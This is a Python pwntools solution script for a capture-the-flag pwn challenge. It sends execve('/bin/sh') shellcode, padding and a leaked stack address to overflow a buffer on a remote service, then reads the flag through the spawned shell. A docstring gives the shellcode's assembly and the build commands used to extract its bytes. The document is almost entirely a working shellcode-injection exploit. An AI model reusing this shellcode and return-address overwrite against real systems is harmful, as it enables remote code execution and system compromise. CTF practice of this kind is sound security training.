from pwn import context, remote, p64

def solution(host: str, port: str) -> str:
    r'''
    "/bin/sh" -> 64bit(8byte) -> "/bin" + "/sh\x00" -> [0x0068732f6e69622f]

    ; shellcode.asm
    mov rax, 0x0068732f6e69622f
    push rax
    mov rdi, rsp    ; filename
    xor rsi, rsi
    xor rdx, rdx    ; 64bit parameter -> rdi, rsi, rdx, rcx, r8, r9
    mov rax, 0x3b   ; sys_execve
    syscall         ;

    $ nasm -f elf64 shellcode.asm
    $ objcopy --dump-section .text=shellcode.bin shellcode.o
    $ xxd -p shellcode.bin | tr -d '\n' | sed 's/\(..\)/\\x\1/g'
    -> "\x48\xb8\x2f...\x0f\x05"
    '''
    context.update({"log_level":"error"})
    with remote(host, port) as rem:
        rem.recvuntil(b"Addr: ")
        variable_address = int(rem.recvline().strip().decode(), 16) 
        shell_code = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05"
        padding = b"A" * (0x58 - len(shell_code))
        rem.sendline(shell_code + padding + p64(variable_address))
        rem.sendline(b"cat ./flag.txt")
        flag = rem.recvline().strip().decode()
    return flag

if __name__ == "__main__":
    host = "challs.watctf.org"
    port = "1991"
    print(solution(host, port))
    